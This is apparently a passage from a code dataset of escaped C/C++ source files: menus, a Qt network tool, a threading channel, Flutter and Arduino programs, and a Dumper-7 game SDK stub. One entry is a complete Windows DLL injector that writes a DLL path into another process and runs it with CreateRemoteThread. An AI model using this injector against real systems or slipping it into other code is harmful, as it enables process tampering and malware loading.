\uc798\ubabb\ub41c \uc785\ub825 \ucc98\ub9ac\n                // \uba54\ub274\uc5d0 \uc5c6\ub294 \ubc88\ud638\ub97c \uc785\ub825\ud588\uc744 \uacbd\uc6b0 \uacbd\uace0 \uba54\uc2dc\uc9c0\ub97c \ucd9c\ub825\ud569\ub2c8\ub2e4.\n                ::cout << \"\uc798\ubabb\ub41c \uc785\ub825\uc785\ub2c8\ub2e4. \ub2e4\uc2dc \uc2dc\ub3c4\ud558\uc138\uc694.\" << endl;\n            }\n        }//while \ub05d\ubd80\ubd84\n    }\n\n    return 0;\n}\n\n",
    "#pragma once\n\n/*\n* SDK generated by Dumper-7\n*\n* https://github.com/Encryqed/Dumper-7\n*/\n\n// Package: T4_Research\n\n#include \"Basic.hpp\"\n\n#include \"T4_Research_classes.hpp\"\n#include \"T4_Research_parameters.hpp\"\n\n\nnamespace SDK\n{\n\n// Function T4_Research.T4_Research_C.ExecuteUbergraph_T4_Research\n// ()\n// Parameters:\n// int32                                   EntryPoint                                             (BlueprintVisible, BlueprintReadOnly, Parm, ZeroConstructor, IsPlainOldData, NoDestructor, HasGetValueTypeHash)\n\nvoid UT4_Research_C::ExecuteUbergraph_T4_Research(int32 EntryPoint)\n{\n\tstatic class UFunction* Func = nullptr;\n\n\tif (Func == nullptr)\n\t\tFunc = Class->GetFunction(\"T4_Research_C\", \"ExecuteUbergraph_T4_Research\");\n\n\tParams::T4_Research_C_ExecuteUbergraph_T4_Research Parms{};\n\n\tParms.EntryPoint = EntryPoint;\n\n\tUObject::ProcessEvent(Func, &Parms);\n}\n\n\n// Function T4_Research.T4_Research_C.Construct\n// (BlueprintCosmetic, Event, Public, BlueprintEvent)\n\nvoid UT4_Research_C::Construct()\n{\n\tstatic class UFunction* Func = nullptr;\n\n\tif (Func == nullptr)\n\t\tFunc = Class->GetFunction(\"T4_Research_C\", \"Construct\");\n\n\tUObject::ProcessEvent(Func, nullptr);\n}\n\n\n// Function T4_Research.T4_Research_C.PreConstruct\n// (BlueprintCosmetic, Event, Public, BlueprintEvent)\n// Parameters:\n// bool                                    IsDesignTime                                           (BlueprintVisible, BlueprintReadOnly, Parm, ZeroConstructor, IsPlainOldData, NoDestructor)\n\nvoid UT4_Research_C::PreConstruct(bool IsDesignTime)\n{\n\tstatic class UFunction* Func = nullptr;\n\n\tif (Func == nullptr)\n\t\tFunc = Class->GetFunction(\"T4_Research_C\", \"PreConstruct\");\n\n\tParams::T4_Research_C_PreConstruct Parms{};\n\n\tParms.IsDesignTime = IsDesignTime;\n\n\tUObject::ProcessEvent(Func, &Parms);\n}\n\n}\n\n",
    "#include \"mainwindow.h\"\n#include \"ui_mainwindow.h\"\n\n#include <QTranslator>\n#include \"define.h\"\n#include <QMessageBox>\n#include <stdlib.h>\n#include <QFileDialog>\n#include <QFile>\n#include <QString>\n#include <QTimer>\n#include <QInputDialog>\n#include <QDateTime>\n#include<wpcapi.h>\n#include<QDebug>\n#include <QByteArray> //QByteArray\u7c7b\u6709\u4e00\u4e2a\u975e\u5e38\u65b9\u4fbf\u7684toHex\u65b9\u6cd5\n#include<QScrollBar>\n#include<QPalette>\n\n#include <QString>\n#include <QRegularExpression>\n#include <QFile>\n#include <QTextStream>\n#include <QtNetwork/QHostAddress>\nMainWindow::MainWindow(QWidget *parent)\n    : QMainWindow(parent)\n    , ui(new Ui::MainWindow)\n{\n    ui->setupUi(this);\n    this->setWindowTitle(\"\u7f51\u7edc\u8c03\u8bd5\u52a9\u624b\");\n    setWindowIcon(QIcon(\":/qrc_/NATIcon.png\"));\n    this->resize(800,300);\n    ui->widget->setVisible(false); //\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0cudp\u7684\u76ee\u7684\u5730\u5740\u548c\u7aef\u53e3\u7684\u7ec4\u4ef6\u4e0d\u663e\u793a\u51fa\u6765\uff0c\u8fde\u63a5\u6210\u529f\u624d\u663e\u793a\u51fa\u6765\n\n    QList<QHostAddress> ipAddressesList = QNetworkInterface::allAddresses();//\u627e\u5230\u4e00\u4e2a\u5408\u9002\u7684\u6e90ip\n    for (const QHostAddress& address : ipAddressesList) {\n        if (address.protocol() == QAbstractSocket::IPv4Protocol) {\n            ui->cb_IpAddr->addItem(address.toString());\n            ip_arr.insert(address.toString());\n        }\n    //           qDebug() << \"\u672c\u673aIP\u5730\u5740: \" << address.toString();\n    }\n    create_file();\n    //\u7ed9\u8f93\u5165\u6846\u8bbe\u7f6e\u89c4\u5219 Qtextedit\u6ca1\u6709setValidator,\u53ea\u6709Qlineedit\u6709\uff0c\u56e0\u6b64\n    //\u4f7f\u7528\u4fe1\u53f7\u4e0e\u69fd\u51fd\u6570\n\n    send_state=1;\n\n    Code_mask_type=QTextCodec::codecForName(\"GBK\");\n\n    connect(ui->cBoxNetType, SIGNAL(currentIndexChanged(int)), this, SLOT(onComboxSelect(int)));//\u9009\u62e9\u7c7b\u578b\u4e0d\u540c\uff0c\u663e\u793a\u4e0d\u540c\u7684\u6837\u5f0f\n\n\n    connect(ui->tEditSendText,&QTextEdit::textChanged,this,&MainWindow::tEditSendText_send_state);//\u8f93\u5165\u6587\u672c\u6846\u53d8\u52a8\uff0c\u68c0\u6d4b\u8f93\u5165\u683c\u5f0f\n    connect(ui->RB_Ascii_Send, &QRadioButton::clicked, this, &MainWindow::str_to_ASCII); //\u53d1\u9001\u8bbe\u7f6e\u7684 ascii\u6309\u94ae \uff0c\u70b9\u51fb\u4e86\u5c31\u4f1a\u89e6\u53d1\u51fd\u6570\n    connect(ui->RB_Hex_Send, &QRadioButton::clicked, this, &MainWindow::str_to_HEX);    //\u53d1\u9001\u8bbe\u7f6e\u7684 hex \u6309\u94ae \uff0c\u70b9\u51fb\u4e86\u5c31\u4f1a\u89e6\u53d1\u51fd\u6570\n    connect(ui->actionANSI_GBK,&QAction::triggered,this,[this](){Code_mask_type=QTextCodec::codecForName(\"GBK\");});\n    connect(ui->actionUTF_8,&QAction::triggered,this,[this](){Code_mask_type=QTextCodec::codecForName(\"UTF-8\");});\n\n    group=new QActionGroup(this);//\u7ed9\u5b57\u7b26\u96c6\u505a\u4e92\u65a5\n    group->addAction(ui->actionANSI_GBK);\n    group->addAction(ui->actionUTF_8);\n    group->setExclusive(true);\n\n}\n\nvoid MainWindow::select_cb_Ip_port_addr( ){\n    QString curr_str=ui->cb_IpAddr->currentText();\n//     curr_str.split(\":\").at(0);\n    ui->cb_IpAddr->setCurrentText(curr_str.split(\":\").at(0));\n    ui->lEditIpPort->setText(curr_str.split(\":\").at(1));\n//    qDebug()<<curr_str<<index ;\n}\nvoid MainWindow::insertcombox1(QSet<QString> arr){\n        ui->cb_IpAddr->clear();\n        for (const QString& str : arr) {\n            ui->cb_IpAddr->addItem(str);\n        }\n        if(ui->cBoxNetType->currentIndex()==TCP_CLIENT_MODE){//\u7b2c\u4e00\u6b21\u7684\u65f6\u5019\uff0c\u9700\u8981\u624b\u52a8\u8bbe\u7f6e\uff0c\n//            ui->cb_IpAddr->set\n            QString curr_str=ui->cb_IpAddr->currentText(); //\u53d6\u5f53\u524d\u7684\u63a7\u4ef6ip\u548cport\n\n            ui->cb_IpAddr->setCurrentText(curr_str.split(\":\").at(0));  //ip\u63a7\u4ef6\u8d4b\u503c\n            ui->lEditIpPort->setText(curr_str.split(\":\").at(1));    //port\u63a7\u4ef6\u8d4b\u503c\n        }\n}\n\n\n\nvoid MainWindow::insertcombox2(QSet<QString> arr){\n    ui->cBox_ip_port2->clear();\n    for (const QString& str : arr) {\n        ui->cBox_ip_port2->addItem(str);\n    }\n}\nvoid MainWindow::insert_file(QSet<QString> arr){\n     file.open(QIODevice::WriteOnly | QIODevice::Text|QIODevice::Truncate);\n         for ( const QString& str : arr) {\n            file.write(str.toUtf8());\n            file.write(\"\\n\");\n         }\n}\nvoid MainWindow::onComboxSelect(int index)\n{\n    //\u83b7\u53d6combobox\u5f53\u524d\u5185\u5bb9\n    switch(index){\n        case 0://udp\n            disconnect(ui->cb_IpAddr, SIGNAL(currentIndexChanged(int)), this, SLOT(select_cb_Ip_port_addr()));\n            ui->cb_IpAddr->setEditable(false);\n            insertcombox1(ip_arr);\n            insertcombox2(ip_port_arr);\n//            insert_file(ip_port_arr);//arr->file\n            ui->label_IP->setText(\"\uff082\uff09\u672c\u5730IP\u5730\u5740\");\n            ui->label_Port->setText(\"\uff083\uff09\u672c\u5730\u7aef\u53e3\");\n            break;\n        case 1://tcp_server\n            disconnect(ui->cb_IpAddr, SIGNAL(currentIndexChanged(int)), this, SLOT(select_cb_Ip_port_addr()));\n            ui->cb_IpAddr->setEditable(false);\n            insertcombox1(ip_arr);\n//            file->arr\n//            file-\u63a7\u4ef6\n           //\u8fdb\u6765\u7684ip_port ->arr\n            //ip_port-> \u63a7\u4ef6\n//            insertcombox2(ip_port_arr);// arr->\u63a7\u4ef6\n            ui->label_IP->setText(\"\uff082\uff09\u672c\u5730IP\u5730\u5740\");\n            ui->label_Port->setText(\"\uff083\uff09\u672c\u5730\u7aef\u53e3\");\n            break;\n        case 2://tcp_client\n//        qDebug()<<\"2\";\n            ui->cb_IpAddr->setEditable(true);//  ip\u5730\u5740\u63a7\u4ef6\u53ef\u4ee5\u9009\u62e9\u7f16\u8f91\u5185\u5bb9\n            if(!ip_port_arr.isEmpty()){\n                insertcombox1(ip_port_arr);         //\u5c06\u5730\u5740\u63d2\u5165\u63a7\u4ef6\u5185\n                connect(ui->cb_IpAddr, SIGNAL(currentIndexChanged(int)), this, SLOT(select_cb_Ip_port_addr()));\n            }\n            ui->label_IP->setText(\"\uff082\uff09\u8fdc\u7a0bIP\u5730\u5740\");\n            ui->label_Port->setText(\"\uff083\uff09\u8fdc\u7a0b\u7aef\u53e3\");\n            break;\n           }\n\n}\n\n//\u70b9\u51fb on_pBtnNetCnnt \u6309\u94ae\uff0c\u5f00\u542f\u670d\u52a1\uff0c\u5165\u53e3\u51fd\u6570\nvoid MainWindow::on_pBtnNetCnn",
    "//  parallel_channel.cpp\n/*\n The MIT License (MIT)\n Copyright (c) 2018 HouSisong\n \n Permission is hereby granted, free of charge, to any person\n obtaining a copy of this software and associated documentation\n files (the \"Software\"), to deal in the Software without\n restriction, including without limitation the rights to use,\n copy, modify, merge, publish, distribute, sublicense, and/or sell\n copies of the Software, and to permit persons to whom the\n Software is furnished to do so, subject to the following\n conditions:\n \n The above copyright notice and this permission notice shall be\n included in all copies of the Software.\n \n THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND,\n EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES\n OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND\n NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT\n HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY,\n WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING\n FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR\n OTHER DEALINGS IN THE SOFTWARE.\n */\n#include \"parallel_channel.h\"\n\n#if (_IS_USED_MULTITHREAD)\n#include <assert.h>\n#include <deque>\n\nclass _CChannel_import{\npublic:\n    explicit _CChannel_import(ptrdiff_t maxDataCount)\n    :_locker(0),_sendCond(0),_acceptCond(0),\n    _maxDataCount(maxDataCount),_waitingCount(0),_isClosed(false){\n        _locker=locker_new();\n        _sendCond=condvar_new();\n        _acceptCond=condvar_new();\n    }\n    ~_CChannel_import(){\n        close();\n        while (true) { //wait all thread exit\n            {\n                CAutoLocker locker(_locker);\n                if (_waitingCount==0) break;\n            }\n            this_thread_yield(); //todo:\u4f18\u5316?\n        }\n        locker_delete(_locker);\n        assert(_dataList.empty()); // why? if saved resource then leaks\n        condvar_delete(_acceptCond);\n        condvar_delete(_sendCond);\n    }\n    void close(){\n        if (_isClosed) return;\n        {\n            CAutoLocker locker(_locker);\n            if (_isClosed) return;\n            _isClosed=true;\n            condvar_broadcast(_sendCond);\n            condvar_broadcast(_acceptCond);\n        }\n    }\n    bool is_can_fast_send(bool isWait){\n        if (_maxDataCount<0) return true;\n        if (_maxDataCount==0) return false;\n\n        CAutoLocker locker(_locker);\n        while (true) {\n            if (_isClosed) return false;\n            if (_dataList.size()<(size_t)_maxDataCount) {\n                return true;\n            }else if(!isWait){\n                return false;\n            }//else wait\n            ++_waitingCount;\n            condvar_wait(_sendCond,&locker);\n            --_waitingCount;\n        }\n    }\n\n    bool send(TChanData data,bool isWait){\n        assert(data!=0);\n        {\n            CAutoLocker locker(_locker);\n            while (true) {\n                if (_isClosed) return false;\n                if ((_maxDataCount<=0)||(_dataList.size()<(size_t)_maxDataCount)) {\n                    try{\n                        _dataList.push_back(data);\n                    }catch(...){\n                        return false;\n                    }\n                    condvar_signal(_acceptCond);\n                    if (_maxDataCount==0) //must wait accepted?\n                        break;// to wait accepted\n                    else\n                        return true; //ok\n                }else if(!isWait){\n                    return false;\n                }//else wait\n                ++_waitingCount;\n                condvar_wait(_sendCond,&locker);\n                --_waitingCount;\n            }\n        }\n\n        //wait accepted\n        while (true) { //wait _dataList empty\n            {\n                CAutoLocker locker(_locker);\n                if (_isClosed) break;\n                if (_dataList.empty()) break;\n            }\n            this_thread_yield(); //todo:\u4f18\u5316;\n        }\n        return true;\n    }\n    TChanData accept(bool isWait){\n        CAutoLocker locker(_locker);\n        while (true) {\n            if (!_dataList.empty()) {\n                TChanData result=_dataList.front();\n                _dataList.pop_front();\n                if (!_isClosed)\n                    condvar_signal(_sendCond);\n                return result; //ok\n            }else if(_isClosed){\n                return 0;\n            }else if(!isWait){\n                return 0;\n            }//else wait\n            ++_waitingCount;\n            condvar_wait(_acceptCond,&locker);\n            --_waitingCount;\n        }\n    }\nprivate:\n    HLocker     _locker;\n    HCondvar    _sendCond;\n    HCondvar    _acceptCond;\n    std::deque<TChanData>   _dataList;\n    const ptrdiff_t         _maxDataCount;\n    volatile size_t         _waitingCount;\n    volatile bool           _isClosed;\n};\n\n\nCChannel::CChannel(ptrdiff_t maxDataCount):_import(0){\n    _import=new _CChannel_import(maxDataCount);\n}\nCChannel::~CChannel(){\n    delete (_CChannel_import*)_import;\n}\nvoid CChannel::clos",
    "#include <flutter/dart_project.h>\r\n#include <flutter/flutter_view_controller.h>\r\n#include <windows.h>\r\n\r\n#include \"flutter_window.h\"\r\n#include \"utils.h\"\r\n\r\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\r\n                      _In_ wchar_t *command_line, _In_ int show_command) {\r\n  // Attach to console when present (e.g., 'flutter run') or create a\r\n  // new console when running with a debugger.\r\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\r\n    CreateAndAttachConsole();\r\n  }\r\n\r\n  // Initialize COM, so that it is available for use in the library and/or\r\n  // plugins.\r\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\r\n\r\n  flutter::DartProject project(L\"data\");\r\n\r\n  std::vector<std::string> command_line_arguments =\r\n      GetCommandLineArguments();\r\n\r\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\r\n\r\n  FlutterWindow window(project);\r\n  Win32Window::Point origin(10, 10);\r\n  Win32Window::Size size(1280, 720);\r\n  if (!window.Create(L\"signupapp\", origin, size)) {\r\n    return EXIT_FAILURE;\r\n  }\r\n  window.SetQuitOnClose(true);\r\n\r\n  ::MSG msg;\r\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\r\n    ::TranslateMessage(&msg);\r\n    ::DispatchMessage(&msg);\r\n  }\r\n\r\n  ::CoUninitialize();\r\n  return EXIT_SUCCESS;\r\n}\r\n",
    "#include \"main.h\"\n#include <iostream>\n#include <string>\n#include <windows.h>\n#include <tlhelp32.h>\nusing namespace std;\n\nvoid WinAPIError();\nbool inject(const char* procName, const char* dllPath);\nDWORD procNameToPID(const char* procName);\nbool dllInjection(DWORD pid, string dll);\n\nint main()\n{\n    string dllPath;\n    string processName;\n\n    cout << \"Enter the path to the DLL (e.g., C:\\\\Path\\\\To\\\\DLL.dll): \";\n    getline(cin, dllPath);\n\n    cout << \"Enter the name of the process to inject into (e.g., explorer.exe): \";\n    getline(cin, processName);\n\n    if (dllPath.empty() || processName.empty())\n    {\n        cerr << \"Error: DLL path or process name is empty.\" << endl;\n        return 1;\n    }\n\n    cout << \"\\nDLL Path: \" << dllPath << endl;\n    cout << \"Process Name: \" << processName << endl;\n\n    if (inject(processName.c_str(), dllPath.c_str()))\n    {\n        cout << \"Injection successful!\" << endl;\n    }\n    else\n    {\n        cerr << \"Injection failed.\" << endl;\n    }\n\n    return 0;\n}\n\nbool inject(const char* procName, const char* dllPath)\n{\n    DWORD pid = procNameToPID(procName);\n\n    cout << \"Searching for process '\" << procName << \"'...\" << endl;\n\n    if (!pid)\n    {\n        cerr << \"Error: Process not found.\" << endl;\n        return false;\n    }\n\n    cout << \"PID Found: \" << pid << \". Attempting injection...\" << endl;\n\n    if (dllInjection(pid, dllPath))\n    {\n        cout << \"Injection succeeded!\" << endl;\n        return true;\n    }\n    else\n    {\n        cerr << \"Injection failed.\" << endl;\n        return false;\n    }\n}\n\nDWORD procNameToPID(const char* procName)\n{\n    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);\n    if (snapshot == INVALID_HANDLE_VALUE)\n    {\n        cerr << \"Error: Unable to create snapshot.\" << endl;\n        return 0;\n    }\n\n    PROCESSENTRY32 process;\n    process.dwSize = sizeof(PROCESSENTRY32);\n\n    if (Process32First(snapshot, &process))\n    {\n        do\n        {\n            if (strcmp(process.szExeFile, procName) == 0)\n            {\n                CloseHandle(snapshot);\n                return process.th32ProcessID;\n            }\n        } while (Process32Next(snapshot, &process));\n    }\n\n    CloseHandle(snapshot);\n    return 0;\n}\n\nbool dllInjection(DWORD pid, string dll)\n{\n    HMODULE kernel32 = GetModuleHandle(\"Kernel32\");\n    FARPROC loadLibrary = GetProcAddress(kernel32, \"LoadLibraryA\");\n\n    HANDLE token;\n    TOKEN_PRIVILEGES tokenPriv;\n\n    if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token))\n    {\n        LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tokenPriv.Privileges[0].Luid);\n        tokenPriv.PrivilegeCount = 1;\n        tokenPriv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;\n\n        if (!AdjustTokenPrivileges(token, FALSE, &tokenPriv, sizeof(tokenPriv), NULL, NULL))\n        {\n            WinAPIError();\n            cerr << \"Error: Could not adjust token privileges.\" << endl;\n            return false;\n        }\n    }\n    else\n    {\n        cerr << \"Error: Cannot open process token.\" << endl;\n        return false;\n    }\n\n    HANDLE processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);\n    if (!processHandle)\n    {\n        cerr << \"Error: Cannot open process.\" << endl;\n        return false;\n    }\n\n    LPVOID remoteDllName = VirtualAllocEx(processHandle, NULL, dll.size() + 1, MEM_COMMIT, PAGE_READWRITE);\n    if (!remoteDllName)\n    {\n        CloseHandle(processHandle);\n        WinAPIError();\n        cerr << \"Error: Could not allocate remote memory.\" << endl;\n        return false;\n    }\n\n    SIZE_T writtenBytes;\n    WriteProcessMemory(processHandle, remoteDllName, dll.c_str(), dll.size() + 1, &writtenBytes);\n\n    HANDLE remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)loadLibrary, remoteDllName, 0, NULL);\n    if (!remoteThread)\n    {\n        VirtualFreeEx(processHandle, remoteDllName, dll.size() + 1, MEM_RELEASE);\n        CloseHandle(processHandle);\n        WinAPIError();\n        cerr << \"Error: Could not create remote thread.\" << endl;\n        return false;\n    }\n\n    bool finished = WaitForSingleObject(remoteThread, 10000) != WAIT_TIMEOUT;\n\n    VirtualFreeEx(processHandle, remoteDllName, dll.size() + 1, MEM_RELEASE);\n    CloseHandle(processHandle);\n\n    if (!finished)\n    {\n        cerr << \"Error: Timeout while waiting for the thread.\" << endl;\n        return false;\n    }\n\n    return true;\n}\n\nvoid WinAPIError()\n{\n    LPSTR errorMessage = NULL;\n    FormatMessage(FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_ALLOCATE_BUFFER, 0, GetLastError(), 0, (LPSTR)&errorMessage, 0, 0);\n    cerr << \"WinAPI Error: \" << errorMessage;\n    LocalFree(errorMessage);\n}",
    "#include<Arduino.h>\n#include<BluetoothSerial.h>\n#include <PS4Controller.h>\n#include<OLED_a.h>\n#include<timer.h>\n#include<teensy_send.h>\n\n#define DEF_NUM 3838\n\noled_attack OLED;\nBluetoothSerial BTSerial;\nAdafruit_NeoPixel pixels = Adafruit_NeoPixel(NUMPIXELS, PIN, NEO_GRB + NEO_KHZ800);\n\nsend_teensy teensy;  //\u30d0\u30c3\u30d5\u30a1\u7684\u306a\ntimer timer_main;\nint timer_[3];\n\nint Mode = 0;\nint Mode_old = 999;\n\n\nint recieveData();\n\nint neopixel_flag = 0;\nint D_A,A_A;\nint D_flag,A_flag;\nint D_v;\nint D_A_15_flag;\n\nint sendPS4();\n\nvoid setup() {\n  delay(1000);\n  Serial.begin(9600);\n  teensy.setup();\n  // BTSerial.begin(\"ESP32\");\n  PS4.begin(\"A0:A3:B3:2D:17:06\");\n  Serial.println(\"Ready.\");\n  OLED.setup(teensy);\n  Mode = 99;\n  pinMode(35,INPUT);\n}\n\nvoid loop() {\n  timer_main.reset();\n  neopixel_flag = 0;\n  if(7 <= Serial2.available()){\n    // Serial.print(\" recieve \");\n    recieveData();\n  }\n  timer_[0] = timer_main.read_ms();\n\n\n  if(Mode == 0){\n    if(Mode != Mode_old){\n      Mode_old = Mode;\n      teensy.set_data(SEND_MODE,0);\n      OLED.start();\n      pixels.clear();\n      pixels.show();\n    }\n\n    OLED.OLED(teensy);\n\n    if(OLED.end_flag == 1){\n      if(OLED.Robot_Mode == 0){\n        Mode = 1;\n      }\n      else if(OLED.Robot_Mode == 1){\n        Mode = 2;\n      }\n\n      if(OLED.test_flag){\n        Mode = 3;\n      }\n    }\n  }\n  if(Mode == 1){\n    if(Mode != Mode_old){\n      Mode_old = Mode;\n      teensy.set_data(SEND_SETPLAY_FLAG,OLED.setplay_flag);\n      teensy.set_data(SEND_MODE,1);\n      pixels.clear();\n      pixels.show();\n    }\n    teensy.set_data(SEND_A_NEO,0);\n    OLED.OLED_moving();\n\n    pixels.clear();\n    if(OLED.option_on[3]){\n      if(A_A == 10){\n        for(int i = 0; i < 15; i++){\n          for(int j = 0; j <= i; j++){\n            if(OLED.check_val[1] < OLED.ang_vel){\n              pixels.setPixelColor(j,pixels.Color(100,0,0));\n            }\n            else{\n              pixels.setPixelColor(j,pixels.Color(100,100,0));\n            }\n          }\n          if(OLED.ang_vel < 10 * i){\n            break;\n          }\n        }\n      }\n      else if(A_A == 12){\n        pixels.setPixelColor(4,pixels.Color(0,200,0));\n      }\n      else if(A_A == 20){\n        pixels.setPixelColor(4,pixels.Color(200,0,0));\n      }\n      else if(A_A == 21){\n        pixels.setPixelColor(4,pixels.Color(200,200,0));\n      }\n      else if(A_A == 22){\n        pixels.setPixelColor(4,pixels.Color(0,200,200));\n      }\n      else if(A_A == 23){\n        pixels.setPixelColor(4,pixels.Color(200,0,200));\n      }\n      if(OLED.cam_on){\n        int ball_pos = 0;\n        ball_pos = ((OLED.cam_vec.return_azimuth()) + 180) / 22.5 - 4;\n        if(ball_pos < 0){\n          ball_pos += 16;\n        }\n        Serial.print(\" b_p : \");\n        Serial.print(ball_pos);\n        if(OLED.goal_color == BLUE){\n          pixels.setPixelColor(ball_pos,pixels.Color(0,0,100));\n        }\n        else if(OLED.goal_color == YELLOW){\n          pixels.setPixelColor(ball_pos,pixels.Color(100,100,0));\n        }\n      }\n      if(OLED.cam_back_on){\n        int ball_pos = 0;\n        ball_pos = -(OLED.cam_back_vec.return_azimuth()) / 22.5 + 12;\n        if(ball_pos < 0){\n          ball_pos += 16;\n        }\n        Serial.print(\" b_p : \");\n        Serial.print(ball_pos);\n        if(OLED.goal_color == BLUE){\n          pixels.setPixelColor(ball_pos,pixels.Color(100,100,0));\n        }\n        else if(OLED.goal_color == YELLOW){\n          pixels.setPixelColor(ball_pos,pixels.Color(0,0,100));\n        }\n      }\n    }\n\n    pixels.show();\n\n    if(digitalRead(OLED.Tact_Switch[1]) == LOW){\n      Mode = 0;\n    }\n\n    if(digitalRead(OLED.Bluetooth_pin) == LOW && OLED.option_on[4]){\n      Mode = 10;\n    }\n  }\n  else if(Mode == 2){\n    if(Mode != Mode_old){\n      Mode_old = Mode;\n      teensy.set_data(SEND_MODE,2);\n      pixels.clear();\n      pixels.show();\n    }\n    OLED.OLED_moving();\n    teensy.set_data(SEND_D_NEO,0);\n    if(OLED.option_on[3]){\n      if(neopixel_flag){\n        pixels.clear();\n        if(D_A == 0){\n          pixels.setPixelColor(5,pixels.Color(100,100,0));\n        }\n        else if(D_A == 5){\n          pixels.setPixelColor(5,pixels.Color(100,0,0));\n        }\n        else if(D_A == 10){\n          for(int i = 0; i < 15; i++){\n            if(D_v < 5 * i){\n              if(D_flag == 0){\n                for(int j = 0; j <= i; j++){\n                  pixels.setPixelColor(j,pixels.Color(100,0,0));\n                }\n              }\n              else if(D_flag == 1){\n                for(int j = 0; j <= i; j++){\n                  pixels.setPixelColor(j,pixels.Color(100,100,0));\n                }\n              }\n              else if(D_flag == 2){\n                for(int j = 0; j <= i; j++){\n                  pixels.setPixelColor(j,pixels.Color(100,0,100));\n                }\n              }\n              break;\n            }\n          }\n        }\n        else if(D_A == 12){\n          pixels.setPixelColor(4,pixels.Color(100,100,0));\n        }\n        else if(D_A == 13){\n          pixels.setPixelColor(4,",
    "#include \"Includes.hpp\"\n#include \"Interface\\Login\\LoginDlg.h\"\n#include \"Interface\\Main\\MainDlg.h\"\n\nvoid ClientNetworkThread()\n{\n    try\n    {\n        g_WebSocketClient->Run(\"ws://localhost:50000\");\n    }\n    catch ([[maybe_unused]] std::exception &e)\n    {\n#if _DEBUG\n        std::cout << \"Exception: \" << e.what() << std::endl;\n#endif\n\n        g_EventManager->NotifyEvent(CEventManager::EventType::ConnectError,\n                                    new EventParam(\"Failed to connect to server!\"));\n    }\n}\n\nint main(int argc, char *argv[])\n{\n    UNREFERENCED_PARAMETER(argc);\n    UNREFERENCED_PARAMETER(argv);\n\n    // Initialize Win32 application\n    //\n    const HINSTANCE hInst = GetModuleHandleA(nullptr);\n    InitCommonControls();\n\n#if _DEBUG\n    std::cout << security::GetHardwareInfo() << std::endl;\n    std::cout << security::GetHardwareId() << std::endl;\n#endif\n\n    // Networking thread runs in separated detached thread\n    //\n    std::thread(&ClientNetworkThread).detach();\n\n    cLoginDlg loginDlg(hInst);\n\n    loginDlg.RunModeless();\n\n    if (!loginDlg.IsLoggedIn())\n    {\n        exit(EXIT_FAILURE);\n    }\n\n    // Run the main dialog\n    //\n    cMainDlg mainDlg(hInst);\n    return (INT)mainDlg.RunModeless();\n}",
    "#include <iostream>\n#include <windows.h>\n#include <string>\n\nusing namespace std;\n\n// Array daftar buku\nstring daftar[5] = {\"Borland C++\", \"Algoritma\", \"Matematika Diskrit\", \"Kalkulus\", \"Komputer Aplikasi\"};\n\n// Fungsi deklarasi\nvoid menu_utama();\nvoid anggota();\nvoid pinjam_buku();\nvoid pengembalian_buku();\nvoid keluar_program();\nvoid pemilihan_berulang();\n\n// Fungsi untuk menampilkan loading\nvoid loading()\n{\n    cout << \"\\n\\tPlease wait...\\n\\n\";\n    for (int i = 0; i < 20; i++)\n    {\n        cout << \".\";\n        Sleep(100);\n    }\n    cout << endl;\n}\n\n// Fungsi menu utama\nvoid menu_utama()\n{\n    system(\"cls\");\n    loading();\n\n    cout << \"\\t============================|\\n\";\n    cout << \"\\t|   PROGRAM PERPUSTAKAAN C++   |\\n\";\n    cout << \"\\t============================|\\n\";\n    cout << \"\\n\\tPilihan Menu: \\n\";\n    cout << \"\\t1. Anggota\\n\";\n    cout << \"\\t2. Pinjam Buku\\n\";\n    cout << \"\\t3. Pengembalian Buku\\n\";\n    cout << \"\\t4. Tutup Program\\n\";\n\n    int pilihan;\n    cout << \"\\n\\tMasukkan Pilihan: \";\n    cin >> pilihan;\n\n    switch (pilihan)\n    {\n    case 1:\n        anggota();\n        break;\n    case 2:\n        pinjam_buku();\n        break;\n    case 3:\n        pengembalian_buku();\n        break;\n    case 4:\n        keluar_program();\n        break;\n    default:\n        cout << \"\\n\\tPilihan tidak valid! Ulangi kembali.\\n\";\n        menu_utama();\n        break;\n    }\n}\n\n// Fungsi anggota\nvoid anggota()\n{\n    system(\"cls\");\n    cout << \"\\t============================\\n\";\n    cout << \"\\t\\tANGGOTA\\n\";\n    cout << \"\\t============================\\n\";\n    cout << \"\\t1. Aulia     (111111***)\\n\";\n    cout << \"\\t2. Prayoga   (111111***)\\n\";\n    cout << \"\\t3. Dewa      (111111***)\\n\";\n    cout << \"\\t4. Mayang    (111111***)\\n\";\n    cout << \"\\t5. Damar     (111111***)\\n\";\n\n    pemilihan_berulang();\n}\n\n// Fungsi pinjam buku\nvoid pinjam_buku()\n{\n    system(\"cls\");\n    cout << \"\\t====================\\n\";\n    cout << \"\\t\\tPINJAM BUKU\\n\";\n    cout << \"\\t====================\\n\";\n\n    for (int i = 0; i < 5; i++)\n    {\n        cout << \"\\t\" << (i + 1) << \". \" << daftar[i] << \"\\n\";\n    }\n\n    string nama;\n    int tanggal, jumlah, kode;\n\n    cout << \"\\n\\tNama: \";\n    cin >> nama;\n    cout << \"\\tMasukkan tanggal pinjam (1-31): \";\n    cin >> tanggal;\n\n    if (tanggal < 